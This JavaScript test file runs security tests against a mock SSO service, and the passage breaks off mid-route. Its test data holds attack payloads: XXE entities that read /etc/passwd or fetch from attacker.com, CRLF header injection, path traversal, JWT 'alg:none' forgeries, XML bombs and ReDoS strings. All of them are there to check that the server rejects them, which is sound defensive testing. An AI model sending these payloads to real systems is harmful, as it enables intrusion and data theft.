/**
 * Penetration Testing Scenarios for SSO System
 */

const request = require('supertest');
const express = require('express');
const crypto = require('crypto');
const { SSOService } = require('../../../services/auth/SSOService');
const { MockJWTProvider, MockGoogleProvider } = require('../mocks/ssoProviders.mock');
const { UserFactory } = require('../factories/userFactory');

describe('SSO Penetration Testing Scenarios', () => {
  let app;
  let ssoService;
  let mockDatabase;
  let jwtProvider;

  beforeEach(async () => {
    mockDatabase = {
      users: new Map(),
      sessions: new Map(),
      authEvents: new Map(),
    };

    const userRepository = {
      findByEmail: email =>
        Promise.resolve(Array.from(mockDatabase.users.values()).find(user => user.email === email)),
      findByProviderId: providerId =>
        Promise.resolve(
          Array.from(mockDatabase.users.values()).find(user => user.providerId === providerId)
        ),
      create: userData => {
        const user = { ...userData, id: `user-${Date.now()}-${Math.random()}` };
        mockDatabase.users.set(user.id, user);
        return Promise.resolve(user);
      },
      update: (id, updates) => {
        const user = mockDatabase.users.get(id);
        if (user) {
          Object.assign(user, updates);
          return Promise.resolve(user);
        }
        return Promise.resolve(null);
      },
    };

    jwtProvider = new MockJWTProvider();
    ssoService = new SSOService({ userRepository, jwtProvider });
    ssoService.registerProvider('google', new MockGoogleProvider());

    app = express();
    app.use(express.json({ limit: '1mb' }));
    setupPenetrationTestRoutes(app, ssoService);
  });

  describe('Authentication Bypass Attempts', () => {
    describe('OAuth State Parameter Manipulation', () => {
      it('should prevent state parameter bypass', async () => {
        const maliciousStates = [
          '', // Empty state
          null,
          undefined,
          'admin=true',
          'user_id=1',
          '../admin',
          '%2e%2e%2fadmin',
          'state&redirect=http://attacker.com',
          'state;DROP TABLE users;--',
          'state||1==1',
          Buffer.from('malicious').toString('base64'),
        ];

        for (const maliciousState of maliciousStates) {
          await request(app)
            .get(
              `/auth/google/callback?code=valid-code&state=${encodeURIComponent(maliciousState || '')}`
            )
            .expect(res => {
              expect([400, 401, 403]).toContain(res.status);
              expect(res.body.error).toBeTruthy();
            });
        }
      });

      it('should prevent state parameter replay attacks', async () => {
        // Get a valid state
        const authResponse = await request(app).get('/auth/google');
        const authUrl = authResponse.headers.location;
        const validState = new URL(authUrl).searchParams.get('state');

        // Use it once successfully
        await request(app)
          .get(`/auth/google/callback?code=valid-code&state=${validState}`)
          .expect(302);

        // Try to reuse the same state
        await request(app)
          .get(`/auth/google/callback?code=another-code&state=${validState}`)
          .expect(400)
          .expect(res => {
            expect(res.body.error).toContain('already been used');
          });
      });

      it('should prevent state parameter prediction', async () => {
        const states = [];

        // Collect multiple states to analyze for patterns
        for (let i = 0; i < 20; i++) {
          const response = await request(app).get('/auth/google');
          const authUrl = response.headers.location;
          const state = new URL(authUrl).searchParams.get('state');
          states.push(state);
        }

        // Verify states are cryptographically random
        const uniqueStates = new Set(states);
        expect(uniqueStates.size).toBe(states.length); // All states should be unique

        // Check for predictable patterns
        for (const state of states) {
          expect(state).toHaveLength(64); // Should be long enough
          expect(state).toMatch(/^[a-f0-9]+$/); // Should be hex
          expect(state).not.toMatch(/^0+|1+|a+/); // Should not be predictable
        }

        // Try predicted states
        const predictedStates = [
          '0'.repeat(64),
          '1'.repeat(64),
          'a'.repeat(64),
          states[0].replace(/./g, '0'), // All zeros
          incrementHex(states[0]), // Incremented
          states[0].slice(0, -1) + '0', // Modified last character
        ];

        for (const predictedState of predictedStates) {
          await request(app)
            .get(`/auth/google/callback?code=valid-code&state=${predictedState}`)
            .expect(400);
        }
      });
    });

    describe('JWT Token Manipulation', () => {
      it('should prevent JWT signature bypass', async () => {
        const validToken = jwtProvider.generateToken({ userId: 'user-123' });
        const [header, payload] = validToken.split('.');

        const bypassAttempts = [
          // No signature
          `${header}.${payload}.`,
          // Wrong signature
          `${header}.${payload}.wrong-signature`,
          // Algorithm confusion - none algorithm
          Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64') +
            '.' +
            payload +
            '.',
          // Modified payload with original signature
          header +
            '.' +
            Buffer.from(JSON.stringify({ userId: 'admin' })).toString('base64') +
            '.' +
            validToken.split('.')[2],
        ];

        for (const token of bypassAttempts) {
          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
        }
      });

      it('should prevent JWT algorithm confusion attacks', async () => {
        const maliciousTokens = [
          // None algorithm
          Buffer.from(JSON.stringify({ alg: 'none' })).toString('base64') +
            '.' +
            Buffer.from(
              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
            ).toString('base64') +
            '.',

          // HMAC with public key
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' +
            Buffer.from(
              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
            ).toString('base64') +
            '.signature',

          // Wrong algorithm
          Buffer.from(JSON.stringify({ alg: 'HS512' })).toString('base64') +
            '.' +
            Buffer.from(
              JSON.stringify({ userId: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 })
            ).toString('base64') +
            '.signature',
        ];

        for (const token of maliciousTokens) {
          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
        }
      });

      it('should prevent JWT payload tampering', async () => {
        const originalToken = jwtProvider.generateToken({
          userId: 'user-123',
          role: 'user',
          exp: Math.floor(Date.now() / 1000) + 3600,
        });

        const [header, , signature] = originalToken.split('.');

        const tamperedPayloads = [
          { userId: 'admin', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 },
          { userId: 'user-123', role: 'admin', exp: Math.floor(Date.now() / 1000) + 3600 },
          { userId: 'user-123', role: 'user', exp: Math.floor(Date.now() / 1000) + 86400 }, // Extended expiry
          {
            userId: 'user-123',
            role: 'user',
            exp: Math.floor(Date.now() / 1000) + 3600,
            admin: true,
          },
        ];

        for (const payload of tamperedPayloads) {
          const tamperedToken =
            header +
            '.' +
            Buffer.from(JSON.stringify(payload)).toString('base64') +
            '.' +
            signature;

          await request(app)
            .get('/protected')
            .set('Authorization', `Bearer ${tamperedToken}`)
            .expect(401);
        }
      });
    });

    describe('Session Hijacking Attempts', () => {
      it('should prevent session fixation attacks', async () => {
        // Try to set a predetermined session ID
        const fixedSessionId = 'attacker-controlled-session';

        await request(app)
          .post('/auth/login')
          .set('Cookie', `sessionId=${fixedSessionId}`)
          .send({ email: 'test@example.com', password: 'password' })
          .expect(res => {
            // Session ID should be regenerated
            const cookies = res.headers['set-cookie'];
            if (cookies) {
              const sessionCookie = cookies.find(cookie => cookie.includes('sessionId'));
              if (sessionCookie) {
                expect(sessionCookie).not.toContain(fixedSessionId);
              }
            }
          });
      });

      it('should prevent session token prediction', async () => {
        const sessions = [];

        // Create multiple sessions to analyze patterns
        for (let i = 0; i < 10; i++) {
          const user = UserFactory.create({ email: `user${i}@example.com` });
          mockDatabase.users.set(user.id, user);

          const token = jwtProvider.generateToken({ userId: user.id });
          sessions.push(token);
        }

        // Verify tokens are not predictable
        const uniqueSessions = new Set(sessions);
        expect(uniqueSessions.size).toBe(sessions.length);

        // Try predictable session tokens
        const predictableTokens = [
          'session-123',
          'admin-token',
          '123456789',
          sessions[0].replace(/.$/, '1'), // Modified last character
          Buffer.from('admin').toString('base64'),
        ];

        for (const token of predictableTokens) {
          await request(app).get('/protected').set('Authorization', `Bearer ${token}`).expect(401);
        }
      });
    });
  });

  describe('Privilege Escalation Attempts', () => {
    describe('Parameter Pollution', () => {
      it('should handle parameter pollution in OAuth callbacks', async () => {
        const pollutionAttempts = [
          '/auth/google/callback?code=valid&code=admin&state=test',
          '/auth/google/callback?code=valid&state=test&state=admin',
          '/auth/google/callback?code=valid&state=test&admin=true',
          '/auth/google/callback?code=valid&state=test&user_id=1',
          '/auth/google/callback?code=valid&state=test&role=admin',
        ];

        for (const url of pollutionAttempts) {
          await request(app)
            .get(url)
            .expect(res => {
              expect([400, 401, 403]).toContain(res.status);
            });
        }
      });

      it('should handle array parameter pollution', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        // Try to pollute role parameter with array
        await request(app)
          .put('/profile')
          .set('Authorization', `Bearer ${token}`)
          .send({
            firstName: 'John',
            role: ['user', 'admin'], // Array pollution
            roles: ['admin'],
            permissions: ['admin'],
          })
          .expect(res => {
            expect(res.status).not.toBe(200);
            if (res.status === 200) {
              expect(res.body.user?.role).not.toBe('admin');
              expect(res.body.user?.roles).not.toContain('admin');
            }
          });
      });
    });

    describe('HTTP Method Override', () => {
      it('should prevent method override attacks', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const methodOverrideAttempts = [
          { method: 'get', headers: { 'X-HTTP-Method-Override': 'DELETE' } },
          { method: 'post', headers: { 'X-HTTP-Method-Override': 'PUT' } },
          { method: 'get', headers: { _method: 'DELETE' } },
          { method: 'post', body: { _method: 'DELETE' } },
        ];

        for (const attempt of methodOverrideAttempts) {
          const req = request(app)
            [attempt.method]('/profile')
            .set('Authorization', `Bearer ${token}`);

          if (attempt.headers) {
            Object.entries(attempt.headers).forEach(([key, value]) => {
              req.set(key, value);
            });
          }

          if (attempt.body) {
            req.send(attempt.body);
          }

          await req.expect(res => {
            // Should not allow method override for destructive operations
            expect(res.status).not.toBe(204); // DELETE success
          });
        }
      });
    });

    describe('Header Injection', () => {
      it('should prevent header injection in redirects', async () => {
        const headerInjectionPayloads = [
          'http://legitimate.com\r\nSet-Cookie: admin=true',
          'http://legitimate.com\r\n\r\n<script>alert("xss")</script>',
          'http://legitimate.com\nLocation: http://attacker.com',
          'http://legitimate.com%0d%0aSet-Cookie: session=admin',
          'http://legitimate.com%0a%0d<script>alert(1)</script>',
        ];

        for (const payload of headerInjectionPayloads) {
          await request(app)
            .get('/auth/google')
            .query({ redirect_uri: payload })
            .expect(res => {
              expect([400, 403]).toContain(res.status);

              // Check that no malicious headers were set
              const cookies = res.headers['set-cookie'];
              if (cookies) {
                expect(cookies.join('')).not.toContain('admin=true');
              }

              const location = res.headers.location;
              if (location) {
                expect(location).not.toContain('attacker.com');
                expect(location).not.toContain('<script>');
              }
            });
        }
      });

      it('should sanitize user-controlled headers', async () => {
        const user = UserFactory.create();
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const maliciousHeaders = {
          'X-Forwarded-For': '127.0.0.1\r\nSet-Cookie: admin=true',
          'User-Agent': 'Browser\r\nLocation: http://attacker.com',
          Referer: 'http://site.com\r\n\r\n<script>alert(1)</script>',
        };

        const req = request(app).get('/protected').set('Authorization', `Bearer ${token}`);

        Object.entries(maliciousHeaders).forEach(([key, value]) => {
          req.set(key, value);
        });

        await req.expect(200);
        // If it succeeds, ensure no malicious headers were processed
      });
    });
  });

  describe('Data Exfiltration Attempts', () => {
    describe('Information Disclosure', () => {
      it('should prevent user enumeration via timing attacks', async () => {
        const existingUser = UserFactory.create({ email: 'existing@example.com' });
        mockDatabase.users.set(existingUser.id, existingUser);

        const timingTests = [
          { email: 'existing@example.com', password: 'wrong' },
          { email: 'nonexistent@example.com', password: 'wrong' },
        ];

        const timings = [];

        for (const test of timingTests) {
          const start = process.hrtime.bigint();

          await request(app).post('/auth/login').send(test).expect(401);

          const end = process.hrtime.bigint();
          const duration = Number(end - start) / 1000000; // Convert to milliseconds
          timings.push({ email: test.email, duration });
        }

        // Timing difference should be minimal (less than 50ms difference)
        const timingDifference = Math.abs(timings[0].duration - timings[1].duration);
        expect(timingDifference).toBeLessThan(50);
      });

      it('should prevent error message information leakage', async () => {
        const sensitiveDataAttempts = [
          { code: 'invalid-code-12345', expectedData: '12345' },
          { code: 'error-sql-injection', expectedData: 'sql' },
          { code: 'debug-trace-info', expectedData: 'trace' },
          { code: '/etc/passwd', expectedData: 'passwd' },
          { code: 'admin-credentials', expectedData: 'credentials' },
        ];

        for (const attempt of sensitiveDataAttempts) {
          await request(app)
            .get(`/auth/google/callback?code=${attempt.code}&state=test`)
            .expect(res => {
              const responseText = JSON.stringify(res.body).toLowerCase();
              expect(responseText).not.toContain(attempt.expectedData);
              expect(responseText).not.toContain('stack trace');
              expect(responseText).not.toContain('debug');
              expect(responseText).not.toContain('database');
              expect(responseText).not.toContain('internal');
            });
        }
      });

      it('should prevent directory traversal in callback parameters', async () => {
        const traversalAttempts = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc//passwd',
          '..%252f..%252f..%252fetc%252fpasswd',
        ];

        for (const attempt of traversalAttempts) {
          await request(app)
            .get(`/auth/google/callback?code=test&state=${encodeURIComponent(attempt)}`)
            .expect(res => {
              expect([400, 403, 404]).toContain(res.status);
              const responseText = JSON.stringify(res.body);
              expect(responseText).not.toContain('root:');
              expect(responseText).not.toContain('passwd');
              expect(responseText).not.toContain('system32');
            });
        }
      });
    });

    describe('XXE and XML Injection', () => {
      it('should prevent XXE attacks in SAML responses', async () => {
        const xxePayloads = [
          '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><samlp:Response>&test;</samlp:Response>',
          '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/collect">]><samlp:Response>&test;</samlp:Response>',
          '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><samlp:Response></samlp:Response>',
        ];

        for (const payload of xxePayloads) {
          await request(app)
            .post('/auth/saml/callback')
            .set('Content-Type', 'application/xml')
            .send(payload)
            .expect(res => {
              expect([400, 403, 500]).toContain(res.status);
              const responseText = JSON.stringify(res.body);
              expect(responseText).not.toContain('root:');
              expect(responseText).not.toContain('passwd');
            });
        }
      });

      it('should prevent XML bomb attacks', async () => {
        const xmlBombs = [
          '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><samlp:Response>&lol3;</samlp:Response>',
          '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><samlp:Response>&c;</samlp:Response>',
        ];

        for (const bomb of xmlBombs) {
          const startTime = Date.now();

          await request(app)
            .post('/auth/saml/callback')
            .set('Content-Type', 'application/xml')
            .timeout(5000)
            .send(bomb)
            .expect(res => {
              const processingTime = Date.now() - startTime;
              // Should not take excessive time to process (DOS protection)
              expect(processingTime).toBeLessThan(2000);
              expect([400, 403, 413, 500]).toContain(res.status);
            });
        }
      });
    });
  });

  describe('Denial of Service Attempts', () => {
    describe('Resource Exhaustion', () => {
      it('should prevent excessive memory consumption', async () => {
        const largePayloads = [
          { field: 'email', value: 'a'.repeat(1000000) }, // 1MB email
          { field: 'firstName', value: 'b'.repeat(500000) }, // 500KB name
          { field: 'state', value: 'c'.repeat(100000) }, // 100KB state
        ];

        for (const payload of largePayloads) {
          await request(app)
            .post('/auth/register')
            .send({ [payload.field]: payload.value })
            .expect(res => {
              expect([400, 413]).toContain(res.status);
            });
        }
      });

      it('should prevent CPU exhaustion via complex regex', async () => {
        const regexDosPayloads = [
          'a'.repeat(50000) + '!', // ReDoS attempt
          'x'.repeat(10000) + 'x'.repeat(10000) + '!',
          '((((((((((a' + 'a'.repeat(100) + ')',
          'a' + 'a?'.repeat(20) + 'a'.repeat(20),
        ];

        for (const payload of regexDosPayloads) {
          const startTime = Date.now();

          await request(app)
            .post('/auth/login')
            .send({ email: `${payload}@example.com`, password: 'test' })
            .timeout(2000)
            .expect(res => {
              const processingTime = Date.now() - startTime;
              expect(processingTime).toBeLessThan(1000); // Should not take too long
              expect([400, 422]).toContain(res.status);
            });
        }
      });

      it('should prevent connection exhaustion', async () => {
        const connectionLimit = 100;
        const promises = [];

        for (let i = 0; i < connectionLimit; i++) {
          promises.push(
            request(app)
              .get('/auth/google')
              .timeout(1000)
              .catch(() => {}) // Ignore individual failures
          );
        }

        // Server should handle the load without crashing
        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => r.status === 'fulfilled');

        // At least some requests should succeed
        expect(successful.length).toBeGreaterThan(connectionLimit * 0.5);
      });
    });

    describe('Rate Limiting Bypass', () => {
      it('should prevent rate limit bypass via IP spoofing', async () => {
        const spoofingHeaders = [
          { 'X-Forwarded-For': '127.0.0.1' },
          { 'X-Real-IP': '192.168.1.1' },
          { 'X-Originating-IP': '10.0.0.1' },
          { 'X-Remote-IP': '172.16.0.1' },
          { 'X-Client-IP': '203.0.113.1' },
        ];

        const email = 'ratelimit@example.com';

        for (const headers of spoofingHeaders) {
          let rateLimitHit = false;

          // Make multiple requests with spoofed headers
          for (let i = 0; i < 10; i++) {
            const response = await request(app)
              .post('/auth/login')
              .set(headers)
              .send({ email, password: 'wrong' });

            if (response.status === 429) {
              rateLimitHit = true;
              break;
            }
          }

          // Rate limiting should still apply despite spoofed headers
          expect(rateLimitHit).toBe(true);
        }
      });

      it('should prevent distributed rate limit bypass', async () => {
        const userAgents = [
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
          'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
          'Mozilla/5.0 (Android 11; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0',
        ];

        let totalRequests = 0;
        let rateLimitedRequests = 0;

        for (const userAgent of userAgents) {
          for (let i = 0; i < 6; i++) {
            totalRequests++;

            const response = await request(app)
              .post('/auth/login')
              .set('User-Agent', userAgent)
              .send({ email: 'distributed@example.com', password: 'wrong' });

            if (response.status === 429) {
              rateLimitedRequests++;
            }
          }
        }

        // Should implement global rate limiting
        expect(rateLimitedRequests).toBeGreaterThan(0);
        expect(rateLimitedRequests / totalRequests).toBeGreaterThan(0.5);
      });
    });
  });

  describe('Advanced Attack Scenarios', () => {
    describe('Race Conditions', () => {
      it('should prevent race condition in user creation', async () => {
        const email = 'race@example.com';
        const concurrentRequests = 10;
        const promises = [];

        // Try to create the same user multiple times simultaneously
        for (let i = 0; i < concurrentRequests; i++) {
          promises.push(
            request(app)
              .post('/auth/register')
              .send({
                email,
                password: 'password123',
                firstName: 'Race',
                lastName: 'Condition',
              })
              .catch(() => {}) // Ignore individual failures
          );
        }

        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 201);

        // Only one user creation should succeed
        expect(successful.length).toBe(1);

        // Verify only one user exists in database
        const users = Array.from(mockDatabase.users.values()).filter(user => user.email === email);
        expect(users.length).toBe(1);
      });

      it('should prevent race condition in OAuth linking', async () => {
        const user = UserFactory.create({ provider: 'local' });
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        const concurrentLinks = 5;
        const promises = [];

        // Try to link to the same provider simultaneously
        for (let i = 0; i < concurrentLinks; i++) {
          promises.push(
            request(app)
              .post('/auth/link/google')
              .set('Authorization', `Bearer ${token}`)
              .send({ providerId: 'google-123' })
              .catch(() => {})
          );
        }

        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => r.status === 'fulfilled' && r.value.status === 200);

        // Only one link operation should succeed
        expect(successful.length).toBeLessThanOrEqual(1);
      });
    });

    describe('Time-of-Check Time-of-Use (TOCTOU)', () => {
      it('should prevent TOCTOU in permission checks', async () => {
        const user = UserFactory.create({ role: 'user' });
        mockDatabase.users.set(user.id, user);
        const token = jwtProvider.generateToken({ userId: user.id });

        // Start an admin operation
        const adminRequest = request(app)
          .delete('/admin/users/other-user')
          .set('Authorization', `Bearer ${token}`);

        // Simultaneously try to elevate privileges
        const privilegeEscalation = request(app)
          .put('/profile')
          .set('Authorization', `Bearer ${token}`)
          .send({ role: 'admin' });

        const [adminResult, escalationResult] = await Promise.allSettled([
          adminRequest,
          privilegeEscalation,
        ]);

        // Admin operation should fail regardless of privilege escalation timing
        if (adminResult.status === 'fulfilled') {
          expect([401, 403]).toContain(adminResult.value.status);
        }

        // Privilege escalation should not succeed
        if (escalationResult.status === 'fulfilled') {
          expect(escalationResult.value.status).not.toBe(200);
        }
      });
    });

    describe('Cache Poisoning', () => {
      it('should prevent cache poisoning via header manipulation', async () => {
        const poisoningAttempts = [
          { 'X-Forwarded-Host': 'attacker.com' },
          { 'X-Forwarded-Proto': 'javascript' },
          { Host: 'attacker.com' },
          { 'X-Original-URL': '/admin/backdoor' },
          { 'X-Rewrite-URL': '/admin/config' },
        ];

        for (const headers of poisoningAttempts) {
          await request(app)
            .get('/auth/google')
            .set(headers)
            .expect(res => {
              if (res.headers.location) {
                expect(res.headers.location).not.toContain('attacker.com');
                expect(res.headers.location).not.toContain('javascript:');
                expect(res.headers.location).not.toContain('/admin/');
              }
            });
        }
      });
    });

    describe('Business Logic Flaws', () => {
      it('should prevent account takeover via email verification bypass', async () => {
        const victim = UserFactory.create({
          email: 'victim@example.com',
          isVerified: false,
          verificationToken: 'victim-token',
        });
        mockDatabase.users.set(victim.id, victim);

        // Try to verify with manipulated token
        const bypassAttempts = [
          'victim-token',
          'admin-override',
          victim.id,
          Buffer.from(victim.id).toString('base64'),
          'victim-token' + '0',
          '../victim-token',
        ];

        for (const token of bypassAttempts) {
          await request(app)
            .post('/auth/verify-email')
            .send({ token })
            .expect(res => {
              if (res.status === 200) {
                // If verification succeeds, it should be the legitimate token
                expect(token).toBe('victim-token');
              } else {
                expect([400, 401, 403]).toContain(res.status);
              }
            });
        }
      });

      it('should prevent privilege escalation via password reset', async () => {
        const admin = UserFactory.createAdmin({ email: 'admin@example.com' });
        mockDatabase.users.set(admin.id, admin);

        // Try to reset admin password without proper authorization
        const resetAttempts = [
          { email: 'admin@example.com' },
          { email: 'admin@example.com', userId: admin.id },
          { email: 'admin@example.com', role: 'admin' },
          { email: 'admin@example.com', bypass: 'true' },
        ];

        for (const attempt of resetAttempts) {
          await request(app)
            .post('/auth/forgot-password')
            .send(attempt)
            .expect(res => {
              // Should either succeed normally (200) or fail (400/401)
              // But should not grant special privileges
              expect([200, 400, 401]).toContain(res.status);

              if (res.status === 200) {
                expect(res.body.adminBypass).toBeFalsy();
                expect(res.body.specialPrivileges).toBeFalsy();
              }
            });
        }
      });
    });
  });
});

// Helper function to increment a hex string
function incrementHex(hexString) {
  const num = BigInt('0x' + hexString);
  const incremented = num + 1n;
  return incremented.toString(16).padStart(hexString.length, '0');
}

// Helper function to set up routes for penetration testing
function setupPenetrationTestRoutes(app, ssoService) {
  let stateStore = new Map();
  let usedCodes = new Set();
  let rateLimitStore = new Map();
  let sessionStore = new Map();

  // Rate limiting middleware
  const rateLimit = (maxRequests = 5, windowMs = 60000) => {
    return (req, res, next) => {
      const ip = req.ip || req.connection.remoteAddress;
      const key = `${ip}:${req.path}`;
      const now = Date.now();

      if (!rateLimitStore.has(key)) {
        rateLimitStore.set(key, { count: 1, resetTime: now + windowMs });
      } else {
        const record = rateLimitStore.get(key);
        if (now > record.resetTime) {
          record.count = 1;
          record.resetTime = now + windowMs;
        } else {
          record.count++;
          if (record.count > maxRequests) {
            return res.status(429).json({ error: 'Rate limit exceeded' });
          }
        }
      }
      next();
    };
  };

  // OAuth authorization
  app.get('/auth/google', (req, res) => {
    const { redirect_uri } = req.query;

    // Validate redirect URI
    if (redirect_uri) {
      const allowedHosts = ['localhost', 'app.example.com'];
      try {
        const url = new URL(redirect_uri);
        if (!allowedHosts.includes(url.hostname)) {
          return res.status(400).json({ error: 'Invalid redirect URI' });
        }
      } catch (e) {
        return res.status(400).json({ error: 'Invalid redirect URI format' });
      }
    }

    // Generate secure random state
    const state = crypto.randomBytes(32).toString('hex');
    stateStore.set(state, { created: Date.now(), used: false });

    const authUrl = `https://accounts.google.com/oauth2/auth?client_id=mock&state=${state}`;
    res.redirect(authUrl);
  });

  // OAuth callback with security checks
  app.get('/auth/google/callback', async (req, res) => {
    const { code, state, error } = req.query;

    if (error) {
      return res.status(400).json({ error: `OAuth error: ${error}` });
    }

    // Validate state parameter
    if (!state) {
      return res.status(400).json({ error: 'Missing state parameter' });
    }

    const stateData = stateStore.get(state);
    if (!stateData) {
      return res.status(400).json({ error: 'Invalid state parameter' });
    }

    if (stateData.used) {
      return res.status(400).json({ error: 'State parameter has already been used' });
    }

    // Check state age (expire after 10 minutes)
    if (Date.now() - stateData.created > 600000) {
      stateStore.delete(state);
      return res.status(400).json({ error: 'State parameter has expired' });
    }

    stateData.used = true;

    // Validate authorization code
    if (!code) {
      return res.status(400).json({ error: 'Missing authorization code' });
    }

    if (usedCodes.has(code)) {
      return res.status(400).json({ error: 'Authorization code has already been used' });
    }

    usedCodes.add(code);

    try {
      // Mock profile creation
      const mockProfile = {
        id: `google-${Math.random().toString(36).substring(2)}`,
        email: `${code.substring(0, 10)}@example.com`,
        name: 'Test User',
        verified_email: true,
      };

      const user = await ssoService.handleOAuthCallback('google', mockProfile);

      // Generate secure session
      const sessionToken = crypto.randomBytes(32).toString('hex');
      sessionStore.set(sessionToken, {
        userId: user.id,
        created: Date.now(),
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
      });

      res.cookie('sessionToken', sessionToken, {
        httpOnly: true,
        secure: false, // Would be true in production
        sameSite: 'strict',
      });

      res.redirect('/dashboard');
    } catch (error) {
      res.status(500).json({ error: 'Authentication failed' });
    }
  });

  // Protected route
  app.get('/protected', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    const token = authHeader.substring(7);

    try {
      const payload = ssoService.jwtProvider.verifyToken(token);
      res.json({ message: 'Access granted', userId: payload.userId });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // Login with rate limiting and timing attack protection
  app.post('/auth/login', rateLimit(5, 300000), async (req, res) => {
    const { email, password } = req.body;

    // Artificial delay to prevent timing attacks
    const delay = Math.random() * 100 + 50; // 50-150ms
    await new Promise(resolve => setTimeout(resolve, delay));

    // Always perform password hashing operation to maintain consistent timing
    const dummyHash = crypto.scryptSync('dummy', 'salt', 64);

    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || []).find(
      u => u.email === email
    );

    if (!user || user.password !== password) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = ssoService.jwtProvider.generateToken({ userId: user.id });
    res.json({ token, user: { id: user.id, email: user.email } });
  });

  // Registration
  app.post('/auth/register', rateLimit(3, 300000), async (req, res) => {
    const { email, password, firstName, lastName } = req.body;

    // Input validation
    if (!email || !password || !firstName || !lastName) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    // Length limits
    if (email.length > 255 || firstName.length > 50 || lastName.length > 50) {
      return res.status(400).json({ error: 'Input too long' });
    }

    try {
      const user = await ssoService.userRepository.create({
        email,
        password,
        firstName,
        lastName,
        isVerified: false,
        verificationToken: crypto.randomBytes(32).toString('hex'),
      });

      res.status(201).json({ message: 'User created', userId: user.id });
    } catch (error) {
      res.status(500).json({ error: 'Registration failed' });
    }
  });

  // Profile update
  app.put('/profile', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);

      // Sanitize inputs
      const updates = {};
      const allowedFields = ['firstName', 'lastName', 'email'];

      for (const [key, value] of Object.entries(req.body)) {
        if (allowedFields.includes(key) && typeof value === 'string') {
          // Basic sanitization
          updates[key] = value.trim().substring(0, 100);
        }
      }

      res.json({ message: 'Profile updated', updates });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // SAML callback (mock)
  app.post('/auth/saml/callback', (req, res) => {
    // In a real implementation, this would parse and validate SAML responses
    // For testing, we just reject all XML payloads as potentially malicious
    res.status(400).json({ error: 'SAML processing not available in test mode' });
  });

  // Admin endpoints (should be protected)
  app.delete('/admin/users/:userId', (req, res) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);

      // Check admin privileges (simplified)
      const user = ssoService.userRepository.mockDatabase?.users?.get(payload.userId);
      if (!user || user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin privileges required' });
      }

      res.json({ message: 'User deleted' });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // Email verification
  app.post('/auth/verify-email', (req, res) => {
    const { token } = req.body;

    if (!token || typeof token !== 'string') {
      return res.status(400).json({ error: 'Invalid verification token' });
    }

    // In a real implementation, this would verify the token securely
    const user = Array.from(ssoService.userRepository.mockDatabase?.users?.values() || []).find(
      u => u.verificationToken === token
    );

    if (!user) {
      return res.status(400).json({ error: 'Invalid or expired verification token' });
    }

    user.isVerified = true;
    user.verificationToken = null;

    res.json({ message: 'Email verified successfully' });
  });

  // Password reset
  app.post('/auth/forgot-password', rateLimit(3, 300000), (req, res) => {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email is required' });
    }

    // Always return success to prevent user enumeration
    res.json({ message: 'If the email exists, a reset link has been sent' });
  });

  // Account linking
  app.post('/auth/link/:provider', (req, res) => {
